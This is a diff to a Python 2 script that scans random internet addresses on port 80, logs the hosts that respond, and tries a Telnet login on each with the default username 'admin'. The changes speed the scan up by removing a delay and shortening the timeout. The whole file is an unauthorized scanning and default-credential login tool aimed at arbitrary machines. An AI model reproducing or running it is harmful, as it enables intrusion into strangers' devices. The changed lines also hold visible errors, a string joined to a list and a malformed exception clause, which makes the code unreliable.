@@ -6,12 +6,11 @@ def randip():
         yield ".".join(str(randint(1, 255)) for i in range(4))
 
 a = []
-nm = nmap.PortScanner()
 fp = open("randip_log.txt", 'w')
 for address in randip():
 	try:
 		s = socket.socket()
-		s.settimeout(5)
+		s.settimeout(3)
 		s.connect((address, 80))
 		print address, "WORKS!!!"
 		hostbyadr = socket.gethostbyaddr(address)
@@ -22,7 +21,6 @@ for address in randip():
 		fp.write(str(hostbyadr))
 		fp.write("\n")
 		print('Beginning Telnet attempt on %s\n' % address)
-		time.sleep(6)
 		tn = telnetlib.Telnet(address, 5)
 		tn.read_until("login: ")
 		tn.write('admin' + '\n')
@@ -37,7 +35,8 @@ for address in randip():
 		tn.close()
 		fp.write('\n')
 		a.append(address)
-	except socket.error:
+		print('Hosts Attempted' + a + '\n')
+	except socket.error or EOFError:
 		if len(a) != 4:
 			continue
 		else:
